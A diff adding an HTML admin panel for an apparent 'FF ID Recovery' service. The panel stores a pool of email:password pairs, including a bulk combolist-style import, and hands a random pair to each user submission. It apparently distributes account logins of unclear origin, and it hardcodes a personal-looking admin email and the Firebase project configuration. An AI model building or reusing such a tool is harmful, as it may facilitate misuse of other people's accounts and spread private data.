@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Admin Panel — FF Recovery</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f1f5f9;--card:#fff;--line:#e2e8f0;--text:#0f172a;--muted:#64748b;
+  --brand:#1d4ed8;--b2:#2563eb;--ok:#059669;--ok-bg:#f0fdf4;--ok-ln:#bbf7d0;
+  --warn:#b45309;--warn-bg:#fffbeb;--warn-ln:#fde68a;--err:#dc2626;--err-bg:#fef2f2;--err-ln:#fecaca;}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',system-ui,sans-serif;color:var(--text);background:var(--bg);min-height:100vh}
+
+/* LOGIN */
+#page-login{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px 16px}
+.lc{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:28px 24px;width:100%;max-width:360px;box-shadow:0 20px 40px -20px rgba(15,23,42,.18)}
+.lc-logo{text-align:center;font-size:38px;margin-bottom:12px}
+.lc h2{text-align:center;font-size:20px;font-weight:700;margin-bottom:4px}
+.lc .sub{text-align:center;color:var(--muted);font-size:13.5px;margin-bottom:22px}
+.lf{margin-bottom:14px}
+.lf label{display:block;font-size:13px;font-weight:600;color:#334155;margin-bottom:6px}
+.lf input{width:100%;padding:12px 14px;font:inherit;font-size:15px;color:var(--text);background:#fff;border:1px solid #cbd5e1;border-radius:12px;outline:none;transition:border-color .2s,box-shadow .2s}
+.lf input:focus{border-color:var(--b2);box-shadow:0 0 0 4px rgba(37,99,235,.12)}
+.lbtn{width:100%;padding:13px;border:0;border-radius:12px;font:inherit;font-size:15.5px;font-weight:600;color:#fff;background:linear-gradient(180deg,var(--b2),var(--brand));cursor:pointer;box-shadow:0 8px 18px -8px rgba(29,78,216,.5);transition:filter .2s}
+.lbtn:hover{filter:brightness(1.07)}
+.lbtn:disabled{opacity:.6;cursor:not-allowed}
+#l-err{margin-top:11px;font-size:13.5px;color:var(--err);text-align:center;min-height:18px}
+
+/* DASHBOARD */
+#page-dash{display:none;min-height:100vh;flex-direction:column}
+.hdr{background:linear-gradient(135deg,#1e3a8a,var(--b2));padding:14px 16px;padding-top:calc(14px + env(safe-area-inset-top,0px));display:flex;align-items:center;justify-content:space-between;gap:10px}
+.hdr-brand{font-size:16px;font-weight:700;color:#fff}
+.hdr-brand small{display:block;font-size:11px;font-weight:400;color:rgba(255,255,255,.65);margin-top:2px}
+.hdr-right{display:flex;gap:7px}
+.hbtn{background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);color:#fff;border-radius:9px;padding:7px 12px;font:inherit;font-size:13px;font-weight:500;cursor:pointer;transition:background .15s}
+.hbtn:hover{background:rgba(255,255,255,.25)}
+
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;padding:12px 12px 0}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px 6px;text-align:center;box-shadow:0 1px 3px rgba(15,23,42,.05)}
+.stat .n{font-size:22px;font-weight:700;line-height:1}
+.stat .l{font-size:11px;color:var(--muted);margin-top:3px}
+.stat.pend .n{color:var(--warn)}
+.stat.ok .n{color:var(--ok)}
+.stat.bl .n{color:var(--brand)}
+
+.tabbar{display:flex;padding:12px 12px 0}
+.tabbar button{flex:1;padding:10px 8px;border:1px solid var(--line);font:inherit;font-size:13.5px;font-weight:500;background:var(--card);color:var(--muted);cursor:pointer;transition:all .15s}
+.tabbar button:first-child{border-radius:10px 0 0 10px}
+.tabbar button:last-child{border-radius:0 10px 10px 0;border-left:0}
+.tabbar button.on{background:var(--brand);border-color:var(--brand);color:#fff;font-weight:600}
+
+.panel{display:none;padding:12px}
+.panel.on{display:block}
+
+/* SUBMISSION CARDS */
+.sc{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px;margin-bottom:10px;box-shadow:0 1px 3px rgba(15,23,42,.05)}
+.sc-top{display:flex;align-items:flex-start;gap:12px}
+.sc-av{width:50px;height:50px;border-radius:50%;object-fit:cover;border:2px solid var(--line);flex:none;background:#e8eefb;display:grid;place-items:center;font-size:20px;color:var(--muted)}
+.sc-av img{width:50px;height:50px;border-radius:50%;object-fit:cover}
+.sc-meta{flex:1;min-width:0}
+.sc-uid{font-weight:700;font-size:14.5px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sc-name{font-size:13px;color:var(--muted);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sc-time{font-size:11.5px;color:#94a3b8;margin-top:4px}
+.sc-foot{display:flex;align-items:center;justify-content:space-between;margin-top:10px}
+.badge{display:inline-block;padding:3px 10px;border-radius:99px;font-size:12px;font-weight:600}
+.b-ok{background:var(--ok-bg);color:var(--ok);border:1px solid var(--ok-ln)}
+.b-warn{background:var(--warn-bg);color:var(--warn);border:1px solid var(--warn-ln)}
+.b-grey{background:#f8fafc;color:#94a3b8;border:1px solid var(--line)}
+
+/* BUTTONS */
+.btn{padding:9px 16px;border:0;border-radius:10px;font:inherit;font-size:13.5px;font-weight:600;cursor:pointer;transition:filter .15s}
+.btn-brand{background:var(--brand);color:#fff;box-shadow:0 4px 10px -4px rgba(29,78,216,.35)}
+.btn-brand:hover{filter:brightness(1.08)}
+.btn-brand:disabled{opacity:.6;cursor:not-allowed}
+.btn-ghost{background:#f1f5f9;color:var(--muted)}
+.btn-ghost:hover{background:#e2e8f0}
+
+/* CREDENTIALS */
+.cs{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 1px 3px rgba(15,23,42,.05)}
+.cs h3{font-size:14px;font-weight:600;color:#334155;margin-bottom:12px}
+.c-row{display:flex;gap:8px;margin-bottom:8px}
+.c-inp{flex:1;padding:11px 12px;font:inherit;font-size:14px;color:var(--text);background:#fff;border:1px solid #cbd5e1;border-radius:10px;outline:none;transition:border-color .2s,box-shadow .2s}
+.c-inp:focus{border-color:var(--b2);box-shadow:0 0 0 3px rgba(37,99,235,.1)}
+.bulk-ta{width:100%;min-height:100px;padding:11px 12px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.65;border:1px solid #cbd5e1;border-radius:10px;outline:none;resize:vertical;margin-bottom:8px;color:var(--text)}
+.bulk-ta:focus{border-color:var(--b2);box-shadow:0 0 0 3px rgba(37,99,235,.1)}
+.bulk-note{font-size:12px;color:var(--muted);margin-bottom:8px}
+.fw{width:100%}
+.cl-wrap{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.cl-head{padding:11px 14px;background:#f8fafc;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;font-size:13px;font-weight:600;color:#334155}
+.cl-item{display:flex;align-items:center;gap:10px;padding:11px 14px;border-bottom:1px solid #f8fafc}
+.cl-item:last-child{border-bottom:0}
+.cl-email{flex:1;font-size:13.5px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.del-btn{padding:4px 9px;border:1px solid var(--err-ln);background:var(--err-bg);color:var(--err);border-radius:7px;font:inherit;font-size:12px;font-weight:600;cursor:pointer;flex:none}
+
+/* MODAL */
+.modal-bg{position:fixed;inset:0;z-index:999;background:rgba(15,23,42,.48);display:none;align-items:flex-end;justify-content:center;padding:12px;padding-bottom:calc(12px + env(safe-area-inset-bottom,0px))}
+.modal-bg.on{display:flex;animation:mfi .2s ease}
+@keyframes mfi{from{opacity:0}to{opacity:1}}
+.modal-box{background:var(--card);border-radius:20px;width:100%;max-width:430px;padding:22px;max-height:88vh;overflow-y:auto;animation:msu .25s ease}
+@keyframes msu{from{transform:translateY(24px);opacity:0}to{transform:none;opacity:1}}
+.m-title{font-size:17px;font-weight:700;margin-bottom:14px}
+.m-sub{display:flex;align-items:center;gap:12px;background:#f8fafc;border:1px solid var(--line);border-radius:12px;padding:12px;margin-bottom:14px}
+.m-av{width:46px;height:46px;border-radius:50%;object-fit:cover;border:2px solid var(--line);flex:none;background:#e8eefb;display:grid;place-items:center;font-size:18px}
+.m-av img{width:46px;height:46px;border-radius:50%;object-fit:cover}
+.m-uid{font-weight:700;font-size:14.5px}
+.m-name{font-size:13px;color:var(--muted);margin-top:2px}
+.cr-box{background:#eff6ff;border:1px solid #bfdbfe;border-radius:12px;padding:14px;margin-bottom:12px}
+.cr-box-sent{background:var(--ok-bg);border-color:var(--ok-ln)}
+.cr-lbl{font-size:11.5px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--b2);margin-bottom:10px}
+.cr-box-sent .cr-lbl{color:var(--ok)}
+.cr-row{display:flex;align-items:center;gap:8px;margin-bottom:8px}
+.cr-row:last-child{margin-bottom:0}
+.cr-k{font-size:12.5px;color:var(--muted);width:66px;flex:none}
+.cr-v{flex:1;font-size:14px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.copy-btn{padding:5px 10px;border:0;border-radius:7px;background:#dbeafe;color:var(--b2);font:inherit;font-size:12.5px;font-weight:600;cursor:pointer;flex:none;transition:background .15s}
+.copy-btn.cp{background:#d1fae5;color:var(--ok)}
+.m-warn{font-size:12.5px;color:var(--warn);background:var(--warn-bg);border:1px solid var(--warn-ln);border-radius:8px;padding:8px 12px;margin-bottom:14px}
+.m-foot{display:flex;gap:8px}
+.m-foot .btn{flex:1}
+
+/* EMPTY STATE */
+.empty{text-align:center;padding:36px 20px;color:var(--muted)}
+.empty .ei{font-size:36px;margin-bottom:10px}
+
+/* TOAST */
+.toast{position:fixed;bottom:calc(16px + env(safe-area-inset-bottom,0px));left:50%;transform:translateX(-50%);background:#0f172a;color:#fff;padding:10px 18px;border-radius:99px;font-size:14px;font-weight:500;z-index:9999;opacity:0;pointer-events:none;transition:opacity .25s;white-space:nowrap}
+.toast.on{opacity:1}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+
+<!-- LOGIN PAGE -->
+<div id="page-login">
+  <div class="lc">
+    <div class="lc-logo">🔐</div>
+    <h2>Admin Panel</h2>
+    <p class="sub">FF ID Recovery — Staff Only</p>
+    <div class="lf"><label>Email</label><input id="l-email" type="email" autocomplete="email" placeholder="Enter admin email"></div>
+    <div class="lf"><label>Password</label><input id="l-pass" type="password" autocomplete="current-password" placeholder="••••••••"></div>
+    <button class="lbtn" id="l-btn">Sign In</button>
+    <div id="l-err"></div>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="page-dash">
+  <header class="hdr">
+    <div class="hdr-brand">FF Recovery Admin<small id="admin-email">—</small></div>
+    <div class="hdr-right">
+      <button class="hbtn" id="refresh-btn">↻</button>
+      <button class="hbtn" id="logout-btn">Sign Out</button>
+    </div>
+  </header>
+
+  <div class="stats">
+    <div class="stat"><div class="n" id="st-tot">—</div><div class="l">Total</div></div>
+    <div class="stat pend"><div class="n" id="st-pend">—</div><div class="l">Pending</div></div>
+    <div class="stat ok"><div class="n" id="st-sent">—</div><div class="l">Sent</div></div>
+    <div class="stat bl"><div class="n" id="st-cred">—</div><div class="l">Creds</div></div>
+  </div>
+
+  <div class="tabbar" style="margin-top:12px">
+    <button class="on" data-t="submissions">📋 Submissions</button>
+    <button data-t="credentials">🔑 Credentials</button>
+  </div>
+
+  <div id="panel-submissions" class="panel on">
+    <div id="sub-list"><div class="empty"><div class="ei">⏳</div>Loading...</div></div>
+  </div>
+
+  <div id="panel-credentials" class="panel">
+    <div class="cs">
+      <h3>Add Single Credential</h3>
+      <div class="c-row">
+        <input class="c-inp" id="c-email" type="email" placeholder="email@example.com">
+        <input class="c-inp" id="c-pass" type="text" placeholder="password">
+      </div>
+      <button class="btn btn-brand fw" id="c-single-btn">Add Credential</button>
+    </div>
+    <div class="cs">
+      <h3>Add Bulk Credentials</h3>
+      <p class="bulk-note">Format: <code>email:password</code> — one per line</p>
+      <textarea class="bulk-ta" id="c-bulk" placeholder="user1@gmail.com:pass123&#10;user2@gmail.com:pass456&#10;user3@gmail.com:pass789"></textarea>
+      <button class="btn btn-brand fw" id="c-bulk-btn">Add All</button>
+    </div>
+    <div class="cl-wrap" id="cl-wrap" style="display:none">
+      <div class="cl-head"><span>Credential Pool</span><span id="cl-count" style="font-weight:400;color:var(--muted)"></span></div>
+      <div id="cl-list"></div>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-bg" id="modal">
+  <div class="modal-box" id="modal-box"></div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+<script>
+const ADMIN = 'hemelbala84@gmail.com';
+const fb = firebase.apps[0] || firebase.initializeApp({
+  apiKey:"AIzaSyA5aewejp7oey-lLeQChERhMEmJCVb7Aaw",
+  authDomain:"ssrrff-a8851.firebaseapp.com",
+  projectId:"ssrrff-a8851",
+  storageBucket:"ssrrff-a8851.firebasestorage.app",
+  messagingSenderId:"715171777937",
+  appId:"1:715171777937:web:cbfaaa548d90d612f61e30"
+});
+const auth = fb.auth();
+const db   = fb.firestore();
+const TS   = () => firebase.firestore.FieldValue.serverTimestamp();
+const $    = id => document.getElementById(id);
+
+let subsCache = [], credsCache = [], pendingSend = null;
+
+/* =========== AUTH =========== */
+auth.onAuthStateChanged(u => {
+  if (u && u.email === ADMIN) {
+    $('page-login').style.display = 'none';
+    $('page-dash').style.cssText = 'display:flex;flex-direction:column';
+    $('admin-email').textContent = u.email;
+    loadAll();
+  } else {
+    if (u) auth.signOut();
+    $('page-dash').style.display = 'none';
+    $('page-login').style.display = '';
+  }
+});
+
+$('l-btn').onclick = async () => {
+  const email = $('l-email').value.trim(), pass = $('l-pass').value;
+  if (!email || !pass) { $('l-err').textContent = 'Please fill in all fields.'; return; }
+  $('l-btn').disabled = true; $('l-btn').textContent = 'Signing in...';
+  $('l-err').textContent = '';
+  try {
+    await auth.signInWithEmailAndPassword(email, pass);
+  } catch(e) {
+    const m = {'auth/wrong-password':'Wrong password.','auth/user-not-found':'No account found.',
+      'auth/invalid-email':'Invalid email.','auth/invalid-credential':'Invalid credentials.',
+      'auth/too-many-requests':'Too many attempts. Please wait.'};
+    $('l-err').textContent = m[e.code] || e.message;
+    $('l-btn').disabled = false; $('l-btn').textContent = 'Sign In';
+  }
+};
+$('l-pass').addEventListener('keydown', e => { if(e.key==='Enter') $('l-btn').click(); });
+$('logout-btn').onclick = () => auth.signOut();
+
+/* =========== TABS =========== */
+document.querySelectorAll('.tabbar button').forEach(btn => {
+  btn.onclick = () => {
+    document.querySelectorAll('.tabbar button').forEach(b => b.classList.remove('on'));
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('on'));
+    btn.classList.add('on');
+    $('panel-' + btn.dataset.t).classList.add('on');
+  };
+});
+
+$('refresh-btn').onclick = loadAll;
+function loadAll(){ loadSubmissions(); loadCredentials(); }
+
+/* =========== SUBMISSIONS =========== */
+async function loadSubmissions() {
+  $('sub-list').innerHTML = '<div class="empty"><div class="ei">⏳</div>Loading submissions...</div>';
+  try {
+    const snap = await db.collection('submissions').orderBy('submittedAt','desc').get();
+    subsCache = snap.docs.map(d => ({ id:d.id, ...d.data() }));
+    renderSubs();
+  } catch(e) {
+    $('sub-list').innerHTML = '<div class="empty"><div class="ei">❌</div>Failed to load. Update your Firestore rules.</div>';
+  }
+}
+
+function renderSubs() {
+  const pend = subsCache.filter(s => s.status !== 'sent').length;
+  const sent = subsCache.filter(s => s.status === 'sent').length;
+  $('st-tot').textContent  = subsCache.length;
+  $('st-pend').textContent = pend;
+  $('st-sent').textContent = sent;
+
+  if (!subsCache.length) {
+    $('sub-list').innerHTML = '<div class="empty"><div class="ei">📭</div>No submissions yet.</div>';
+    return;
+  }
+
+  $('sub-list').innerHTML = subsCache.map((s, i) => {
+    const ts = s.submittedAt
+      ? new Date(s.submittedAt.seconds*1000).toLocaleString('en-GB',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'})
+      : '—';
+    const isSent = s.status === 'sent';
+    const avPic = s.picBase64
+      ? '<img src="' + s.picBase64 + '" alt="" style="width:50px;height:50px;border-radius:50%;object-fit:cover;border:2px solid #e2e8f0">'
+      : '👤';
+    return '<div class="sc">'
+      + '<div class="sc-top">'
+      + '<div class="sc-av">' + avPic + '</div>'
+      + '<div class="sc-meta">'
+      + '<div class="sc-uid">UID: ' + esc(s.uid||'—') + '</div>'
+      + '<div class="sc-name">' + esc(s.name||'—') + '</div>'
+      + '<div class="sc-time">' + ts + '</div>'
+      + '</div>'
+      + '<span class="badge ' + (isSent ? 'b-ok' : 'b-warn') + '">' + (isSent ? '✓ Sent' : '● Pending') + '</span>'
+      + '</div>'
+      + '<div class="sc-foot">'
+      + (isSent
+          ? '<button class="btn btn-ghost" style="font-size:13px;padding:7px 13px" onclick="viewSent(' + i + ')">👁 View Sent</button>'
+          : '<button class="btn btn-brand" style="font-size:13px;padding:7px 13px" onclick="openSend(' + i + ')">Send Credential →</button>')
+      + '</div></div>';
+  }).join('');
+}
+
+/* =========== SEND MODAL =========== */
+async function openSend(idx) {
+  const sub = subsCache[idx];
+  if (!sub) return;
+  const snap = await db.collection('credentials').where('used','==',false).get();
+  if (snap.empty) {
+    openModal('<h3 class="m-title">No Credentials Available</h3>'
+      + '<p style="color:var(--muted);font-size:14px;margin-bottom:16px">Add credentials in the Credentials tab first.</p>'
+      + '<div class="m-foot"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>');
+    return;
+  }
+  const docs = snap.docs;
+  const picked = docs[Math.floor(Math.random() * docs.length)];
+  const cred = picked.data();
+  pendingSend = { subId:sub.id, credId:picked.id, email:cred.email, password:cred.password };
+
+  const avPic = sub.picBase64
+    ? '<img src="' + sub.picBase64 + '" alt="" style="width:46px;height:46px;border-radius:50%;object-fit:cover;border:2px solid #e2e8f0">'
+    : '👤';
+
+  openModal('<h3 class="m-title">Send Credential</h3>'
+    + '<div class="m-sub"><div class="m-av">' + avPic + '</div>'
+    + '<div><div class="m-uid">UID: ' + esc(sub.uid||'—') + '</div><div class="m-name">' + esc(sub.name||'—') + '</div></div></div>'
+    + '<div class="cr-box">'
+    + '<div class="cr-lbl">Randomly Assigned Credential</div>'
+    + '<div class="cr-row"><span class="cr-k">Email</span><span class="cr-v" id="rv-em">' + esc(cred.email) + '</span><button class="copy-btn" onclick="doCopy(\'rv-em\',this)">Copy</button></div>'
+    + '<div class="cr-row"><span class="cr-k">Password</span><span class="cr-v" id="rv-pw">' + esc(cred.password) + '</span><button class="copy-btn" onclick="doCopy(\'rv-pw\',this)">Copy</button></div>'
+    + '</div>'
+    + '<p class="m-warn">⚠ Confirming will mark this credential as used and cannot be undone.</p>'
+    + '<div class="m-foot"><button class="btn btn-ghost" onclick="closeModal()">Cancel</button>'
+    + '<button class="btn btn-brand" id="confirm-btn" onclick="confirmSend()">Confirm & Mark Sent</button></div>');
+}
+
+async function confirmSend() {
+  if (!pendingSend) return;
+  $('confirm-btn').disabled = true;
+  $('confirm-btn').textContent = 'Saving...';
+  try {
+    const batch = db.batch();
+    batch.update(db.collection('submissions').doc(pendingSend.subId), {
+      status:'sent', sentEmail:pendingSend.email, sentPassword:pendingSend.password,
+      sentAt:TS(), sentCredentialId:pendingSend.credId
+    });
+    batch.update(db.collection('credentials').doc(pendingSend.credId), {
+      used:true, usedAt:TS(), usedForSubmission:pendingSend.subId
+    });
+    await batch.commit();
+    closeModal();
+    toast('✅ Marked as sent!');
+    loadAll();
+  } catch(e) {
+    toast('Error: ' + e.message);
+    $('confirm-btn').disabled = false;
+    $('confirm-btn').textContent = 'Confirm & Mark Sent';
+  }
+}
+
+function viewSent(idx) {
+  const s = subsCache[idx];
+  if (!s) return;
+  const sentTime = s.sentAt
+    ? new Date(s.sentAt.seconds*1000).toLocaleString('en-GB',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'})
+    : '—';
+  const avPic = s.picBase64
+    ? '<img src="' + s.picBase64 + '" alt="" style="width:46px;height:46px;border-radius:50%;object-fit:cover;border:2px solid #e2e8f0">'
+    : '👤';
+  openModal('<h3 class="m-title">Sent Credential</h3>'
+    + '<div class="m-sub"><div class="m-av">' + avPic + '</div>'
+    + '<div><div class="m-uid">UID: ' + esc(s.uid||'—') + '</div><div class="m-name">' + esc(s.name||'—') + '</div></div></div>'
+    + '<div class="cr-box cr-box-sent">'
+    + '<div class="cr-lbl">Credential Sent</div>'
+    + '<div class="cr-row"><span class="cr-k">Email</span><span class="cr-v" id="rv-em">' + esc(s.sentEmail||'—') + '</span><button class="copy-btn" onclick="doCopy(\'rv-em\',this)">Copy</button></div>'
+    + '<div class="cr-row"><span class="cr-k">Password</span><span class="cr-v" id="rv-pw">' + esc(s.sentPassword||'—') + '</span><button class="copy-btn" onclick="doCopy(\'rv-pw\',this)">Copy</button></div>'
+    + '</div>'
+    + '<p style="font-size:12.5px;color:var(--muted);margin-bottom:14px">Sent on: ' + sentTime + '</p>'
+    + '<div class="m-foot"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>');
+}
+
+/* =========== CREDENTIALS =========== */
+async function loadCredentials() {
+  try {
+    const snap = await db.collection('credentials').orderBy('addedAt','desc').get();
+    credsCache = snap.docs.map(d => ({ id:d.id, ...d.data() }));
+    renderCreds();
+  } catch(e) {}
+}
+
+function renderCreds() {
+  const avail = credsCache.filter(c => !c.used).length;
+  const used  = credsCache.filter(c =>  c.used).length;
+  $('st-cred').textContent = avail;
+  if (!credsCache.length) { $('cl-wrap').style.display = 'none'; return; }
+  $('cl-wrap').style.display = '';
+  $('cl-count').textContent = avail + ' available · ' + used + ' used';
+  $('cl-list').innerHTML = credsCache.map(c =>
+    '<div class="cl-item">'
+    + '<div class="cl-email">' + esc(c.email||'') + '</div>'
+    + '<span class="badge ' + (c.used ? 'b-grey' : 'b-ok') + '">' + (c.used ? 'Used' : 'OK') + '</span>'
+    + '<button class="del-btn" onclick="delCred(\'' + c.id + '\')">✕</button>'
+    + '</div>'
+  ).join('');
+}
+
+$('c-single-btn').onclick = async () => {
+  const email = $('c-email').value.trim(), pass = $('c-pass').value.trim();
+  if (!email || !pass) { toast('Enter email and password'); return; }
+  $('c-single-btn').disabled = true; $('c-single-btn').textContent = 'Adding...';
+  try {
+    await db.collection('credentials').add({ email, password:pass, used:false, addedAt:TS() });
+    $('c-email').value = ''; $('c-pass').value = '';
+    toast('✅ Credential added');
+    loadCredentials();
+  } catch(e) { toast('Error: ' + e.message); }
+  $('c-single-btn').disabled = false; $('c-single-btn').textContent = 'Add Credential';
+};
+
+$('c-bulk-btn').onclick = async () => {
+  const text = $('c-bulk').value.trim();
+  if (!text) { toast('Paste credentials first'); return; }
+  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
+  const parsed = [];
+  for (const line of lines) {
+    const idx = line.indexOf(':');
+    if (idx === -1) continue;
+    const email = line.slice(0, idx).trim();
+    const password = line.slice(idx + 1).trim();
+    if (email && password) parsed.push({ email, password });
+  }
+  if (!parsed.length) { toast('No valid lines. Use email:password format'); return; }
+  $('c-bulk-btn').disabled = true; $('c-bulk-btn').textContent = 'Adding ' + parsed.length + '...';
+  try {
+    const chunks = [];
+    for (let i = 0; i < parsed.length; i += 400) chunks.push(parsed.slice(i, i+400));
+    for (const chunk of chunks) {
+      const batch = db.batch();
+      chunk.forEach(c => { const r = db.collection('credentials').doc(); batch.set(r, { ...c, used:false, addedAt:TS() }); });
+      await batch.commit();
+    }
+    $('c-bulk').value = '';
+    toast('✅ ' + parsed.length + ' credentials added');
+    loadCredentials();
+  } catch(e) { toast('Error: ' + e.message); }
+  $('c-bulk-btn').disabled = false; $('c-bulk-btn').textContent = 'Add All';
+};
+
+async function delCred(id) {
+  if (!confirm('Delete this credential?')) return;
+  try { await db.collection('credentials').doc(id).delete(); toast('Deleted'); loadCredentials(); }
+  catch(e) { toast('Error: ' + e.message); }
+}
+
+/* =========== HELPERS =========== */
+function openModal(html) {
+  $('modal-box').innerHTML = html;
+  $('modal').classList.add('on');
+}
+function closeModal() {
+  $('modal').classList.remove('on');
+  pendingSend = null;
+}
+$('modal').onclick = e => { if (e.target === $('modal')) closeModal(); };
+
+function doCopy(id, btn) {
+  navigator.clipboard.writeText($(id).textContent).then(() => {
+    const o = btn.textContent; btn.textContent = 'Copied!'; btn.classList.add('cp');
+    setTimeout(() => { btn.textContent = o; btn.classList.remove('cp'); }, 2000);
+  });
+}
+
+let toastT;
+function toast(msg) {
+  const t = $('toast'); t.textContent = msg; t.classList.add('on');
+  clearTimeout(toastT); toastT = setTimeout(() => t.classList.remove('on'), 2800);
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+</script>
+</body>
+</html>
